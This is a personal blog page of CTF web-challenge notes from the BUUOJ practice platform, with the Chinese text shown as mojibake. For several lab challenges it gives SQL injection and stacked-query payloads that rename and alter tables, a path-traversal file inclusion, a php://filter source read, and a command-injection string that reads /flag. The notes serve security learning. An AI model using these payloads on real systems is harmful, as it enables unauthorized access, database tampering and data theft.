<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"n9-zqc.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
  </script>

  <meta name="description" content="ç¬¬ä¸€é¡µçš„buuojä¸­çš„webé¢˜ç›®">
<meta property="og:type" content="article">
<meta property="og:title" content="buuojç¬¬ä¸€é¡µWebé¢˜">
<meta property="og:url" content="https://n9-zqc.github.io/2022/05/28/buuoj%E7%AC%AC%E4%B8%80%E9%A1%B5Web%E9%A2%98/index.html">
<meta property="og:site_name" content="N9-zqc">
<meta property="og:description" content="ç¬¬ä¸€é¡µçš„buuojä¸­çš„webé¢˜ç›®">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://n9-zqc.github.io/">
<meta property="og:image" content="https://n9-zqc.github.io/">
<meta property="article:published_time" content="2022-05-28T09:08:20.000Z">
<meta property="article:modified_time" content="2022-05-28T09:09:51.496Z">
<meta property="article:author" content="N9-zqc">
<meta property="article:tag" content="buuojå¹³å°">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://n9-zqc.github.io/">

<link rel="canonical" href="https://n9-zqc.github.io/2022/05/28/buuoj%E7%AC%AC%E4%B8%80%E9%A1%B5Web%E9%A2%98/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>buuojç¬¬ä¸€é¡µWebé¢˜ | N9-zqc</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">N9-zqc</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">æœ‰å…³ç½‘ç»œå®‰å…¨çš„å­¦ä¹ ç¬”è®°</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-æ–‡ç« ">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>æ–‡ç« </a>

  </li>
        <li class="menu-item menu-item-æ ‡ç­¾">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a>

  </li>
        <li class="menu-item menu-item-åˆ†ç±»">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-æŸ¥æ‰¾">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>æŸ¥æ‰¾</a>

  </li>
        <li class="menu-item menu-item-å…³äº">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://n9-zqc.github.io/2022/05/28/buuoj%E7%AC%AC%E4%B8%80%E9%A1%B5Web%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="N9-zqc">
      <meta itemprop="description" content="ä¸»è¦æœ‰å…³ctfçš„å­¦ä¹ ç¬”è®°,ä¸»æ”»é€†å‘å’ŒWeb">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="N9-zqc">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          buuojç¬¬ä¸€é¡µWebé¢˜
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-05-28 17:08:20 / Modified: 17:09:51" itemprop="dateCreated datePublished" datetime="2022-05-28T17:08:20+08:00">2022-05-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">ctfæ¯”èµ›</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>ç¬¬ä¸€é¡µçš„buuojä¸­çš„webé¢˜ç›®</p>
<span id="more"></span>

<h4 id="æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h4><p>ç”¨æˆ·å admiâ€™ or 1=1# å³å¯è·å¾—flag</p>
<h4 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æç¤ºflag not here, and flag in ffffllllaaaagggg</p>
<h5 id="include-REQUEST-â€˜fileâ€™-åŸç†æ˜¯hint-php-è¢«å½“ä½œç›®å½•ï¼Œä¹‹åä¸Šè·³ç›®å½•å°±å¥½äº†ï¼ˆè¿™ä¸ªåªé€‚ç”¨äºlinuxï¼‰"><a href="#include-REQUEST-â€˜fileâ€™-åŸç†æ˜¯hint-php-è¢«å½“ä½œç›®å½•ï¼Œä¹‹åä¸Šè·³ç›®å½•å°±å¥½äº†ï¼ˆè¿™ä¸ªåªé€‚ç”¨äºlinuxï¼‰" class="headerlink" title="include $_REQUEST[â€˜fileâ€™];  åŸç†æ˜¯hint.php?/è¢«å½“ä½œç›®å½•ï¼Œä¹‹åä¸Šè·³ç›®å½•å°±å¥½äº†ï¼ˆè¿™ä¸ªåªé€‚ç”¨äºlinuxï¼‰"></a>include $_REQUEST[â€˜fileâ€™];  åŸç†æ˜¯hint.php?/è¢«å½“ä½œç›®å½•ï¼Œä¹‹åä¸Šè·³ç›®å½•å°±å¥½äº†ï¼ˆè¿™ä¸ªåªé€‚ç”¨äºlinuxï¼‰</h5><p>æ„é€ ?file=hint.php?../../../../../ffffllllaaaagggg</p>
<h4 id="æå®¢å¤§æŒ‘æˆ˜-2019-Havefun"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Havefun" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun</h4><p>?cat=dog</p>
<h4 id="ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include</h4><p>åˆ©ç”¨php://filter<br>â€ƒâ€ƒåˆ©ç”¨phpæµfilterè¿”å›base64åŠ å¯†åçš„phpæºä»£ç ï¼Œå¦‚ä¸‹ä»£ç å’Œæˆªå›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨phpçš„filteræœºåˆ¶æ¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„phpæºä»£ç ã€‚è¿™é‡Œå‡è®¾æºä»£ç æ–‡ä»¶ä¸ºflag.phpï¼Œä¸”åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹ï¼Œæ„é€ payloadä¼šè·å–åˆ°å¯¹åº”ä»£ç çš„base64ç¼–ç ï¼Œç„¶åå†è§£å¯†å³å¯ã€‚</p>
<p>?file=php://filter/convert.base64-encode/resource=flag.php</p>
<p>PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7NmJmOTA2ZDEtMzkyNS00MjUxLWEzNTctNzIxNTNiNjlkNmJhfQo</p>
<?php
echo "Can you find out the flag?";
//flag{6bf906d1-3925-4251-a357-72153b69d6ba}

#### [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨

order by æµ‹è¯•æœ‰2åˆ—

1';show databases; 

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;ctftraining&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">18</span>) <span class="string">&quot;information_schema&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;mysql&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">18</span>) <span class="string">&quot;performance_schema&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;supersqli&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;test&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table>

1'show tables;#

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

##### æ³¨æ„ï¼šåœ¨windowsç³»ç»Ÿä¸‹ï¼Œåå•å¼•å·ï¼ˆ`ï¼‰æ˜¯æ•°æ®åº“ã€è¡¨ã€ç´¢å¼•ã€åˆ—å’Œåˆ«åç”¨çš„å¼•ç”¨ç¬¦

##### eg. mysql> SELECT * FROM `table` WHERE `id` = '123' ;

##### 1919810931114514å¿…é¡»ç”¨åå•å¼•å·æ‹¬èµ·æ¥ï¼Œä½†æ˜¯wordsä¸éœ€è¦ï¼Œåº”è¯¥æ˜¯å’Œæ•°æ®ç±»å‹æœ‰å…³

0';show columns from words;#

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">6</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;id&quot;</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;int(10)&quot;</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;NO&quot;</span></span><br><span class="line">  [<span class="number">3</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line">  [<span class="number">4</span>]=&gt;</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">  [<span class="number">5</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">array</span>(<span class="number">6</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;data&quot;</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;varchar(20)&quot;</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;NO&quot;</span></span><br><span class="line">  [<span class="number">3</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line">  [<span class="number">4</span>]=&gt;</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">  [<span class="number">5</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

**çŒœæµ‹æˆ‘ä»¬æäº¤æŸ¥è¯¢çš„çª—å£å°±æ˜¯åœ¨è¿™ä¸ªè¡¨é‡ŒæŸ¥è¯¢æ•°æ®çš„**,**æŸ¥è¯¢è¯­å¥å¾ˆæœ‰å¯èƒ½æ˜¯ : selsect id,data from words where id =**

1';desc `1919810931114514`;#

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">6</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;flag&quot;</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">12</span>) <span class="string">&quot;varchar(100)&quot;</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;NO&quot;</span></span><br><span class="line">  [<span class="number">3</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line">  [<span class="number">4</span>]=&gt;</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">  [<span class="number">5</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

**å› ä¸ºå¯ä»¥å †å æŸ¥è¯¢ï¼Œè¿™æ—¶å€™å°±æƒ³åˆ°äº†ä¸€ä¸ªæ”¹åçš„æ–¹æ³•ï¼ŒæŠŠwordséšä¾¿æ”¹æˆwords1ï¼Œç„¶åæŠŠ1919810931114514æ”¹æˆwordsï¼Œå†æŠŠåˆ—åflagæ”¹æˆidï¼Œç»“åˆä¸Šé¢çš„1' or 1=1#çˆ†å‡ºè¡¨æ‰€æœ‰å†…å®¹å°±å¯ä»¥æŸ¥flagå•¦**

**payload**:

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</span><br></pre></td></tr></table></figure>

å†0' or 1=1#  å³å¯è·å¾—flagã€‚

##### æ–¹æ³•äºŒï¼šé¢„å¤„ç†è¯­å¥+å †å æ³¨å…¥

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE name ``from` `&#x27;[my sql sequece]&#x27;``;  ``//é¢„å®šä¹‰SQLè¯­å¥``</span><br><span class="line">EXECUTE name; ``//æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥``</span><br><span class="line">(DEALLOCATE || DROP) PREPARE name; ``//åˆ é™¤é¢„å®šä¹‰SQL    è¯­å¥</span><br></pre></td></tr></table></figure>

ã€€é¢„å®šä¹‰è¯­å¥ä¹Ÿå¯ä»¥é€šè¿‡å˜é‡è¿›è¡Œä¼ é€’:ã€€

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SET @tn = ``&#x27;hahaha&#x27;``; ``//å­˜å‚¨è¡¨å``</span><br><span class="line">SET @sql = concat(``&#x27;select * from &#x27;``, @tn); ``//å­˜å‚¨SQLè¯­å¥``</span><br><span class="line">PREPARE name ``from` `@sql;  ``//é¢„å®šä¹‰SQLè¯­å¥``</span><br><span class="line">EXECUTE name; ``//æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥``</span><br><span class="line">(DEALLOCATE || DROP) PREPARE sqla; ``//åˆ é™¤é¢„å®šä¹‰SQLè¯­å¥</span><br></pre></td></tr></table></figure>

ã€€ã€€

æœ¬é¢˜å³å¯åˆ©ç”¨ char() å‡½æ•°å°†selectçš„ASCIIç è½¬æ¢ä¸ºselectå­—ç¬¦ä¸²ï¼Œæ¥ç€åˆ©ç”¨concat()å‡½æ•°è¿›è¡Œæ‹¼æ¥å¾—åˆ°selectæŸ¥è¯¢è¯­å¥ï¼Œä»è€Œç»•è¿‡è¿‡æ»¤ã€‚æˆ–è€…ç›´æ¥ç”¨concat()å‡½æ•°æ‹¼æ¥selectæ¥ç»•è¿‡ã€‚

char(115,101,108,101,99,116)<----->'select'

###### payload1ï¼šä¸ä½¿ç”¨å˜é‡

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;PREPARE hacker from concat(char(115,101,108,101,99,116), &#x27; * from `1919810931114514` &#x27;);EXECUTE hacker;#</span><br></pre></td></tr></table></figure>

###### payload2ï¼šä½¿ç”¨å˜é‡

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;SET @sqli=concat(char(115,101,108,101,99,116),&#x27;* from `1919810931114514`&#x27;);PREPARE hacker from @sqli;EXECUTE hacker;#</span><br></pre></td></tr></table></figure>

###### payload3ï¼šåªæ˜¯ç”¨contact(),ä¸ä½¿ç”¨char()

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;PREPARE hacker from concat(&#x27;``s``&#x27;,&#x27;``elect``&#x27;, &#x27;` `* ``from` ``1919810931114514` &#x27;);EXECUTE hacker;#</span><br></pre></td></tr></table></figure>

ä»¥ä¸Šéƒ½å¯ä»¥ç›´æ¥è·å¾—flagã€‚

#### [ACTF2020 æ–°ç”Ÿèµ›]Exec

127.0.0.1 & cat /flag         å³å¯è·å¾—flagã€‚ å‘½ä»¤æ³¨å…¥

#### [SUCTF 2019]EasySQL

##### å †å æŸ¥è¯¢æ³¨å…¥æ”»å‡»

